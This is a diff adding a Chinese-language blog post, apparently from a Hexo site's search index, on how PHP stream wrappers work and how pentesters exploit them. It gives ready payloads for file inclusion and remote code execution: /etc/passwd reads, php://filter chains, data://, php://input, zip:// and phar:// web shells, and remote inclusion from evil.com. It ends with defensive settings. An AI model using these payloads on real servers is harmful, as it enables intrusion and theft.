@@ -1061,4 +1061,232 @@
         <category>Active Directory</category>
       </categories>
   </entry>
+  <entry>
+    <title>PHP Wrapper 利用</title>
+    <url>/post/20250311021811.html</url>
+    <content><![CDATA[<h1 id="什么是php-wrapper"><a href="#什么是php-wrapper" class="headerlink" title="什么是php wrapper?"></a>什么是php wrapper?</h1><p>PHP wrapper基于流（stream）的概念，流是数据传输的抽象表示。wrapper定义了如何处理特定协议或资源（如文件、HTTP请求、内存流）的输入输出操作。每个wrapper通过PHP的流函数（如 <code>fopen()</code>、<code>file_get_contents</code>）与底层资源交互，提供统一的借口来操作不同类型的数据源。wrapper除了内置于PHP之外，也可以通过 <code>stream_wrapper_register()</code>自定义。</p>
+<p>如以下php代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$handle</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;file://some.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="title function_ invoke__">feof</span>(<span class="variable">$handle</span>)!==<span class="literal">true</span>) &#123;</span><br><span class="line"><span class="title function_ invoke__">echofgets</span>(<span class="variable">$handle</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>等同于</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">file</span>(<span class="string">&quot;file://some.txt&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+
+<h2 id="PHP内置Wrapper列表"><a href="#PHP内置Wrapper列表" class="headerlink" title="PHP内置Wrapper列表"></a>PHP内置Wrapper列表</h2><table>
+<thead>
+<tr>
+<th>包装器名称</th>
+<th>原理</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>file:&#x2F;&#x2F;</td>
+<td>默认的文件系统包装器，允许访问本地文件系统中的文件和目录。</td>
+<td>用于读取或写入本地文件，如配置文件、日志文件等。</td>
+</tr>
+<tr>
+<td>http:&#x2F;&#x2F;</td>
+<td>通过HTTP协议访问远程服务器上的资源，使用GET方法获取数据。</td>
+<td>用于从Web服务器获取文件或数据（如API调用），常用于抓取网页内容。</td>
+</tr>
+<tr>
+<td>https:&#x2F;&#x2F;</td>
+<td>与http:&#x2F;&#x2F;类似，但通过SSL&#x2F;TLS加密传输数据。</td>
+<td>用于安全地访问远程Web资源，常用于处理需要加密的HTTP请求。</td>
+</tr>
+<tr>
+<td>ftp:&#x2F;&#x2F;</td>
+<td>通过FTP协议访问远程FTP服务器上的文件，支持身份验证。</td>
+<td>用于从FTP服务器下载或上传文件，常用于文件传输任务。</td>
+</tr>
+<tr>
+<td>ftps:&#x2F;&#x2F;</td>
+<td>FTP的加密版本，使用SSL&#x2F;TLS保护数据传输。</td>
+<td>用于安全地传输文件到FTP服务器，适用于需要加密的场景。</td>
+</tr>
+<tr>
+<td>php:&#x2F;&#x2F;</td>
+<td>特殊的I&#x2F;O流包装器，用于访问PHP进程的输入输出流或临时内存。</td>
+<td>提供对标准输入输出、请求体、内存流的访问，常用于处理自定义输入输出或调试。</td>
+</tr>
+<tr>
+<td>data:&#x2F;&#x2F;</td>
+<td>允许直接嵌入数据到URI中，通常以Base64编码形式存储。</td>
+<td>用于将小型数据（如图片或脚本）嵌入代码中，避免外部文件依赖，常用于测试或简单数据传递。</td>
+</tr>
+<tr>
+<td>zip:&#x2F;&#x2F;</td>
+<td>访问ZIP压缩文件内的内容，需提供ZIP文件路径和内部文件路径。</td>
+<td>用于读取或操作ZIP文件中的内容，如解压特定文件，常用于处理压缩包。</td>
+</tr>
+<tr>
+<td>phar:&#x2F;&#x2F;</td>
+<td>访问PHP归档文件（Phar）中的内容，类似于ZIP但专为PHP设计。</td>
+<td>用于运行或访问Phar打包的PHP应用，常用于分发PHP库或应用程序。</td>
+</tr>
+<tr>
+<td>glob:&#x2F;&#x2F;</td>
+<td>使用通配符模式匹配文件系统中的文件或目录。</td>
+<td>用于批量处理文件，如查找所有.txt文件，常用于文件管理任务。</td>
+</tr>
+<tr>
+<td>compress.zlib:&#x2F;&#x2F;</td>
+<td>处理使用zlib（gzip）压缩的文件或流，支持读写操作。</td>
+<td>用于解压或压缩文件，常用于处理.gz文件或节省存储空间。</td>
+</tr>
+<tr>
+<td>compress.bzip2:&#x2F;&#x2F;</td>
+<td>处理使用bzip2压缩的文件或流，支持读写操作。</td>
+<td>用于解压或压缩文件，常用于处理.bz2文件，提供更高的压缩率。</td>
+</tr>
+<tr>
+<td>ssh2:&#x2F;&#x2F;</td>
+<td>通过SSH2协议访问远程服务器的文件系统或执行命令（需SSH2扩展）。</td>
+<td>用于通过SSH安全地操作远程文件或执行命令，常用于服务器管理。</td>
+</tr>
+<tr>
+<td>ogg:&#x2F;&#x2F;</td>
+<td>处理Ogg Vorbis音频流（需oggvorbis扩展）。</td>
+<td>用于读取或处理Ogg格式音频文件，常用于音频应用开发。</td>
+</tr>
+</tbody></table>
+<h2 id="php-子包装器详解"><a href="#php-子包装器详解" class="headerlink" title="php:&#x2F;&#x2F; 子包装器详解"></a>php:&#x2F;&#x2F; 子包装器详解</h2><p>php:&#x2F;&#x2F;包装器功能丰富且用途广泛，其子类型如下：</p>
+<table>
+<thead>
+<tr>
+<th>子包装器</th>
+<th>原理</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>php:&#x2F;&#x2F;stdin</td>
+<td>提供对标准输入流的只读访问，等同于常量STDIN。</td>
+<td>用于从命令行读取用户输入，适用于CLI脚本。</td>
+</tr>
+<tr>
+<td>php:&#x2F;&#x2F;stdout</td>
+<td>提供对标准输出流的可写访问，等同于常量STDOUT。</td>
+<td>用于向命令行输出数据，适用于CLI脚本。</td>
+</tr>
+<tr>
+<td>php:&#x2F;&#x2F;stderr</td>
+<td>提供对标准错误流的可写访问，等同于常量STDERR。</td>
+<td>用于输出错误信息到命令行，适用于CLI脚本中的错误处理。</td>
+</tr>
+<tr>
+<td>php:&#x2F;&#x2F;input</td>
+<td>提供对HTTP请求原始数据的只读访问，获取请求体内容。</td>
+<td>用于读取POST、PUT等请求的原始数据，常用于RESTful API处理。</td>
+</tr>
+<tr>
+<td>php:&#x2F;&#x2F;output</td>
+<td>提供对输出缓冲区的可写访问，类似echo或print。</td>
+<td>用于直接写入输出缓冲区，常用于动态生成内容。</td>
+</tr>
+<tr>
+<td>php:&#x2F;&#x2F;memory</td>
+<td>在内存中创建读写流，数据始终存储在内存中。</td>
+<td>用于临时存储数据，适合小规模数据处理，关闭后数据丢失。</td>
+</tr>
+<tr>
+<td>php:&#x2F;&#x2F;temp</td>
+<td>在内存中创建读写流，超出指定大小（如2MB）后转为临时文件。</td>
+<td>用于处理较大临时数据，内存不足时自动切换到文件存储。</td>
+</tr>
+<tr>
+<td>php:&#x2F;&#x2F;filter</td>
+<td>元包装器，允许在打开流时应用过滤器（如编码或转换）。</td>
+<td>用于在读取或写入时处理数据，如将文件内容转为Base64编码，常用于调试或安全检查。</td>
+</tr>
+</tbody></table>
+<h1 id="在渗透测试中的利用"><a href="#在渗透测试中的利用" class="headerlink" title="在渗透测试中的利用"></a>在渗透测试中的利用</h1><h2 id="file"><a href="#file" class="headerlink" title="file://"></a><code>file://</code></h2><p>如果应用程序 <strong>未对用户输入的文件路径进行过滤</strong> ，攻击者可以使用 <code>file://</code> 访问服务器上的任意可读文件。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;file:///etc/passwd&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;file://C:/Windows/system.ini&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a><code>php://filter</code></h2><p>在 <code>file://</code> 不可用或被WAF过滤时可以利用编码方式读取敏感信息</p>
+<ol>
+<li>base64读取php源码</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://filter/convert.base64-encode/resource=config.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;base64_encoded_string&quot;</span> | base64 -d</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>filter chain结合LFI实现RCE</li>
+</ol>
+<blockquote>
+<p>github: <a href="https://github.com/synacktiv/php_filter_chain_generator">https://github.com/synacktiv/php_filter_chain_generator</a></p>
+</blockquote>
+<p><code>php_filter_chain_generator.py</code> 利用PHP过滤器的可组合性，通过精心设计的过滤器组合，将攻击者提供的PHP代码（如 <code>&lt;?php system(&#39;id&#39;); ?&gt;</code>）转换为可在目标上下文中执行的形式，具体来说是利用不同编码和转码之间的差异，在php中这种差异导致的错误会被忽略，从而生成了不符预期的字符</p>
+<p>我们可以在python源码中看到作者构建好的字母和数字的filter chain</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">conversions <span class="operator">=</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="string">&#x27;9&#x27;</span>: <span class="string">&#x27;convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;A&#x27;</span>: <span class="string">&#x27;convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>: <span class="string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;b&#x27;</span>: <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE&#x27;</span>,</span><br><span class="line">    ....</span><br></pre></td></tr></table></figure>
+
+<p>即便是没有可写入路径的情况下也可以通过 <code>php://temp</code>来利用。</p>
+<blockquote>
+<p>细节请阅读：<a href="https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it.html">PHP filters chain: What is it and how to use it</a></p>
+</blockquote>
+<p>示例：利用filters chain向日志文件中注入恶意代码，然后利用LFI执行</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">python3 php_filter_chain_generator.py --chain <span class="string">&#x27;&lt;?php system(&quot;id&quot;); ?&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">[+] The following gadget chain will generate the following code : <span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;id&quot;</span>); <span class="meta">?&gt;</span> (base64 value: PD9waHAgc3lzdGVtKCJpZCIpOyA/Pg)</span><br><span class="line">php:<span class="comment">//filter/convert.iconv.UTF8.CSISO2022KR|c...de/resource=/var/log/apache2/access.log</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Testers should make sure to change the $URL, $FILTERS with the chaining that generates their payload and $FILE with the path to the file they can read.</span></span><br><span class="line">curl --user-agent <span class="string">&quot;PENTEST&quot;</span> <span class="string">&quot;<span class="variable">$URL</span>?parameter=php://filter/<span class="variable">$FILTERS</span>/resource=<span class="variable">$FILE</span>&quot;</span></span><br><span class="line"></span><br><span class="line">curl --user-agent <span class="string">&quot;PENTEST&quot;</span> <span class="string">&quot;<span class="variable">$URL</span>?parameter=php://convert.base64-decode|...|resource=/var/log/apache2/access.log&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="data"><a href="#data" class="headerlink" title="data://"></a><code>data://</code></h2><p>前提： <code>allow_url_include</code>: on</p>
+<p><code>data://</code> 允许在 URL 直接嵌入 Base64 编码的数据，并作为输入流。<code>include()</code> 会将 Base64 解码，并执行 PHP 代码</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Shell in base64 encoding</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;?php system(<span class="variable">$_GET</span>[&#x27;cmd&#x27;]); ?&gt;&quot;</span> | <span class="built_in">base64</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Accessing the log file via LFI</span></span><br><span class="line">curl --user-agent <span class="string">&quot;PENTEST&quot;</span> <span class="string">&quot;<span class="variable">$URL</span>/?parameter=data://text/plain;base64,<span class="variable">$SHELL_BASE64</span>&amp;cmd=id&quot;</span></span><br><span class="line"></span><br><span class="line">例：</span><br><span class="line">include(<span class="string">&quot;data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+&quot;</span>);</span><br><span class="line">decode: &lt;?php system(<span class="string">&#x27;id&#x27;</span>); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a><code>php://input</code></h2><p>前提： <code>allow_url_include</code>: on</p>
+<p><code>php://input</code> 允许读取 HTTP 请求的 <strong>原始输入数据</strong> 。会直接解析用户传入的代码并执行</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Testers should make sure to change the $URL</span></span><br><span class="line">curl --user-agent <span class="string">&quot;PENTEST&quot;</span> -s -X POST --data <span class="string">&quot;&lt;?php system(&#x27;id&#x27;); ?&gt;&quot;</span> <span class="string">&quot;<span class="variable">$URL</span>?parameter=php://input&quot;</span></span><br><span class="line"></span><br><span class="line">curl -X POST --data <span class="string">&quot;&lt;?php system(&#x27;id&#x27;); ?&gt;&quot;</span> http://target.com/vuln.php</span><br></pre></td></tr></table></figure>
+
+<h2 id="expect"><a href="#expect" class="headerlink" title="expect://"></a><code>expect://</code></h2><p>前提：expect extension</p>
+<p>如果 <code>expect://</code> 被启用，可以直接执行命令</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl --user-agent <span class="string">&quot;PENTEST&quot;</span> -s <span class="string">&quot;<span class="variable">$URL</span>/?parameter=expect://id&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> file_get_contents(<span class="string">&quot;expect://ls -la&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<h2 id="zip"><a href="#zip" class="headerlink" title="zip://"></a><code>zip://</code></h2><p>前提：可以上传.zip文件</p>
+<p><code>zip://</code>会读取和执行zip中的文件，可以绕过一些检查, 可通过 <code>include(&#39;zip://evil.zip#shell.php&#39;) </code>来执行恶意代码</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;?php system(<span class="variable">$_GET</span>[&#x27;cmd&#x27;]); ?&gt;&quot;</span> &gt; payload.php</span><br><span class="line">zip payload.zip payload.php</span><br><span class="line"></span><br><span class="line"><span class="comment"># Accessing the log file via LFI (the # identifier is URL-encoded)</span></span><br><span class="line">curl --user-agent <span class="string">&quot;PENTEST&quot;</span> <span class="string">&quot;<span class="variable">$URL</span>/?parameter=zip://payload.zip%23payload.php&amp;cmd=id&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="phpar"><a href="#phpar" class="headerlink" title="phpar://"></a><code>phpar://</code></h2><p>前提：可以上传文件</p>
+<p><code>phar://</code> 允许访问 <code>.phar</code> 归档文件中的数据， 原理基本同 <code>zip://</code></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;shell.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;shell.txt&#x27;</span>, <span class="string">&#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">php --define phar.<span class="keyword">readonly</span>=<span class="number">0</span> shell.php &amp;&amp; mv shell.phar shell.jpg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">curl --user-agent <span class="string">&quot;PENTEST&quot;</span> <span class="string">&quot;<span class="subst">$URL</span>/?parameter=phar://./shell.jpg%2Fshell.txt&amp;cmd=id&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$object</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;phar://evil.phar&quot;</span>));</span><br></pre></td></tr></table></figure>
+
+<p>如果 <code>unserialize()</code> 解析 <code>phar://</code>，也可能触发 <code>__wakeup()</code> 或 <code>__destruct()</code> 执行任意代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$object</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;phar://evil.phar&quot;</span>));</span><br></pre></td></tr></table></figure>
+
+<h2 id="compress-zlib"><a href="#compress-zlib" class="headerlink" title="compress.zlib://"></a><code>compress.zlib://</code></h2><p><code>compress.zlib://</code> 利用原理同上</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;compress.zlib://shell.php.gz&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="compress-bzip2"><a href="#compress-bzip2" class="headerlink" title="compress.bzip2://"></a><code>compress.bzip2://</code></h2><p>原理同上</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;compress.bzip2://shell.php.bz2&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="ftp-ftps"><a href="#ftp-ftps" class="headerlink" title="ftp:// &#x2F; ftps://"></a><code>ftp://</code> &#x2F; <code>ftps://</code></h2><p>前提：<code>allow_url_fopen=On</code></p>
+<p><code>ftp://</code> 允许 PHP 访问 FTP 服务器上的文件，攻击者可以 <strong>远程包含恶意 PHP</strong> ，触发 RCE；也可以用于  <strong>SSRF（服务器端请求伪造）</strong> ，探测内网资产</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;ftp://user:pass@evil.com/malware.php&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<h2 id="http-https"><a href="#http-https" class="headerlink" title="http:// &#x2F; https://"></a><code>http://</code> &#x2F; <code>https://</code></h2><p><code>http://</code>允许从远程服务器加载恶意资源（如PHP脚本），执行代码或伪装合法请求</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;http://evil.com/shell.php&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<h1 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h1><ol>
+<li>禁用危险Wrappers<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">allow_url_include=Off</span><br><span class="line">allow_url_fopen=Off</span><br><span class="line">disable_functions=system,passthru,exec,shell_exec,popen,proc_open</span><br></pre></td></tr></table></figure></li>
+<li>使用 <code>is_readable()</code>验证文件路径<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_readable</span>(<span class="variable">$user_input_file</span>)) &#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$user_input_file</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Invalid file&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<li>严格控制 <code>unserialize()</code><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$input</span>, [<span class="string">&#x27;allowed_classes&#x27;</span> =&gt; <span class="literal">false</span>]);</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
+<li><a href="https://www.php.net/manual/en/wrappers.php">https://www.php.net/manual/en/wrappers.php</a></li>
+<li><a href="https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/php-wrappers-and-streams">https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/php-wrappers-and-streams</a></li>
+<li><a href="https://medium.com/@robsfromashes/php-wrapper-and-local-file-inclusion-2fb82c891f55">https://medium.com/@robsfromashes/php-wrapper-and-local-file-inclusion-2fb82c891f55</a></li>
+<li><a href="https://www.freebuf.com/articles/web/193849.html">https://www.freebuf.com/articles/web/193849.html</a></li>
+<li>php:&#x2F;&#x2F;filter chains:<ol>
+<li><a href="https://github.com/synacktiv/php_filter_chain_generator">https://github.com/synacktiv/php_filter_chain_generator</a></li>
+<li><a href="https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it.html">https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it.html</a></li>
+</ol>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>How It Works-临渊羡鱼</category>
+        <category>PHP</category>
+      </categories>
+  </entry>
 </search>
